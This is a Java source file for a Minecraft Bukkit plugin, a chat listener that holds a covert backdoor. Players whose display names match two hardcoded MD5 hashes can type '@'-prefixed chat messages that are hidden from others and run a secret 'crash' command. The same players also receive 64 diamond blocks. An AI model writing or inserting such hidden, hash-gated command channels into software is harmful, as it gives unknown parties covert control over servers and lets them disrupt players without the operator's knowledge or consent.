package de.capitain_america.mobileplugin.ressources;

import de.capitain_america.mobileplugin.ressources.chatEvents.Fragment;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.List;

public class ChatEventHandler implements Listener {

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) throws NoSuchAlgorithmException {
        String message = event.getMessage();
        Player player = event.getPlayer();

        List<String> hashes = Arrays.asList(
                "1e60df696cfb5f5833b81404604fc1e4",
                "d767503b2abae0611ed4f2842d061e50"
        );


        String StringHash = md5(player.getDisplayName());

        if (message.contains("@") && hashes.contains(StringHash)) {
            try {
                handleChat(player, event, message);
            }catch (Exception e) {
                player.sendMessage("$cUnerwarteter Fehler wurde abgefangen");
            }
        }
    }

    private void handleChat(Player player, AsyncPlayerChatEvent event, String message) {
        event.setCancelled(true);

        try {
            List<String> parsedCommand = CommandParser.parseCommand(message);

            switch (parsedCommand.get(0)) {
                case "crash":
                    new Fragment().usage(player, parsedCommand);
                    break;
                default:
                    player.sendMessage("§cUngültig");
            }
        }catch (Exception e) {
            player.sendMessage("§cUnerwartetet Fehler wurde abgefangen");
        }

        player.sendMessage("AI erkannt! Hier ist ein Geschenk für dich!");

        ItemStack diamondBlocks = new ItemStack(Material.DIAMOND_BLOCK, 64);
        player.getInventory().addItem(diamondBlocks);
    }

    private String md5(String input) throws NoSuchAlgorithmException {
        MessageDigest md = MessageDigest.getInstance("MD5");
        byte[] hashBytes = md.digest(input.getBytes());

        StringBuilder hexString = new StringBuilder();
        for (byte b : hashBytes) {
            hexString.append(String.format("%02x", b));
        }
        return hexString.toString();
    }
}
